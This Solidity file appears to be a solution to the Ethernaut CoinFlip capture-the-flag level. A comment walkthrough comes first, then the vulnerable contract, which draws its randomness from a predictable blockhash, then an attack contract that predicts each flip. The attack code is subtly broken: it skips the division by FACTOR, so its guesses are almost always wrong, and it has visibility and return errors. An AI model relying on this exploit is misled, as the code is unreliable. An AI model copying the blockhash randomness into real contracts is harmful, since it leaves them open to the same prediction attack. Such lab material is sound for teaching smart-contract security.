/*

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. 
To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

This contract uses Openzeppelin's safeMath library for arithmetic operations.
contract has a state varibale which is exposed to public called consecutiveWins.
contract has a state varibale called lasthash
contract has a state variable called FACTOR which is a constant.

contract has a constructor which assigns value 0 to consecutiveWins variable.

contract has a function flip which is a public function. This functions takes a boolean argument as input and returns a boolean as output.

Flip function has a local variable blockValue which stores the uint256 converted blockhash of the (latestblock-1) number.
The function then reverts the transaction if lastHash value is equal to blockValue.
The function assigns the blockValue to lastHash
The declare a new variable called coinFlip and assings a value (blockValue.div(Factor))
If the value of coinFlip is 1 then side is true, if it's not 1 then the side value is false.

Now if the side variable value is equal to true, we win and if not then we lose.

The solution to solve this is to predict the value of side and then pass the same value as an argument guess to the flip function.

This prediction can be accurately done by writing a contract which simulate the side value and call the flip function in CoinFlip contract with side as the value.

 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

// Attack contract to guess right everyTime and win the coinFlip game
contract AttackCoinFlipGame {

  CoinFlip public coinflip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address coinflipAddress) {
    coinflip = CoinFlip(coinflipAddress);
  }

  function guessRight() public returns(bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(blockValue);
    bool side = coinFlip ==1 ? true : false;
    coinflip.flip(side);

  }

}